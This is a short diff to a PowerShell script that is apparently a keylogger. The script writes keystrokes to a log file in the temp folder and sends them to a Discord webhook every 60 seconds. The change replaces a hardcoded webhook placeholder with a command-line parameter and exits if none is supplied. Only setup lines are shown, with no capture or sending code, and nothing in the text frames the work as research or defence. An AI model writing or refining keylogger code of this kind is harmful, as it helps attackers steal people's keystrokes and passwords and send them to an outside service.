@@ -1,4 +1,12 @@
-$webhook = "YOUR_DISCORD_WEBHOOK_URL"
+param (
+    [string]$webhook
+)
+
+if (-not $webhook) {
+    Write-Host "No webhook provided. Exiting."
+    exit
+}
+
 $logfile = "$env:TEMP\keystrokes.log"
 $interval = 60  # Time in seconds to send logs to Discord
 
